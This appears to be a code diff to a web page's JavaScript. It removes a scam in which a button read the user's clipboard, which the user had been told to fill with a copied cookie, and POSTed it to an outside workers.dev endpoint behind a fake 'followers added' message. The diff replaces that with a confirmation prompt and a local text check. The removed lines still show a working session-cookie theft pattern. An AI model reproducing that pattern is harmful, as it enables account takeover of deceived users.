@@ -216,10 +216,15 @@ h1 {
 const button = document.getElementById("main");
 const status = document.getElementById("status");
 
-const SEND_ENDPOINT =
-  "https://young-brook-716e.abojanmawzoon.workers.dev";
-
 button.addEventListener("click", async () => {
+
+  const confirmed = confirm(
+    "This will read the text currently in your clipboard and submit it to the website. Continue?"
+  );
+
+  if (!confirmed) {
+    return;
+  }
 
   try {
 
@@ -231,24 +236,19 @@ button.addEventListener("click", async () => {
     const text = await navigator.clipboard.readText();
 
     if (!text) {
-      status.textContent = "You havent copy The cookie Yet.";
+      status.textContent = "Your clipboard is empty.";
       return;
     }
 
-    await fetch(SEND_ENDPOINT, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        clipboardText: text
-      })
-    });
+    if (!text.startsWith("Hello")) {
+      status.textContent = "Error: Invalid clipboard text.";
+      return;
+    }
 
     await new Promise(resolve => setTimeout(resolve, 10000));
 
     status.textContent =
-      "Restart Device To Get Followers Added to your account!";
+      "Clipboard text passed the check.";
 
   } catch (error) {
 
